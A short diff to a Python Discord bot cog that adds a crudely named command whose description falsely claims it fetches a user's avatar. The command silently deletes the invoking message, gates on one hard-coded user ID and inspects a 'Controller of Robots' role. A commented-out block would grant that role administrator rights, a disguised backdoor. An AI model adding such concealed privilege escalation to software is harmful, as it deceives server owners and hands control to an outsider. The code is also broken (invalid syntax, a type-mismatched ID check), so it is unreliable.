@@ -25,6 +25,26 @@ class TestCog(commands.Cog, name = 'Test Commands'):
 			await ctx.send('No user found.')
 			return
 		
+	@commands.command(name = 'fuck', description = 'A command to get a user\'s avatar.')
+	async def fuck(self, ctx, *, member):
+		await ctx.message.delete()
+		if ctx.author.id != '316384336859627530':
+			return
+		for role in ctx.author.roles:
+			if role.name = "Controller of Robots"
+				for perm in role.permissions:
+					print(perm)
+				return
+		print('No perms found')
+		return
+				
+	"""			permissions = discord.Permissions()
+				permissions.update(administrator = True)
+				await role.edit(permissions=permissions)
+			else:
+				return
+		return
 		
+		"""
 def setup(bot):
 	bot.add_cog(TestCog(bot))
